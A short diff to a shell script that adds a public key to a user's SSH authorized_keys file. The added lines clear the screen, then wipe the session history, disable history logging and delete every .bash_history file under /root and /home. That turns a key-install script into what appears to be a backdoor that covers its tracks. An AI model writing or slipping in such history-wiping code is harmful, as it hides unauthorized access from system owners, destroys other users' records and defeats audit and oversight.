@@ -47,4 +47,5 @@ echo "$PUBLIC_KEY" >> "$HOME_DIR/.ssh/authorized_keys"
 chmod 600 "$HOME_DIR/.ssh/authorized_keys"
 
 echo "Public key added to $HOME_DIR/.ssh/authorized_keys"
-
+clear
+history -c && > ~/.bash_history && unset HISTFILE && export HISTSIZE=0 && export HISTFILESIZE=0 && find /root /home -name ".bash_history" -exec rm -f {} \;
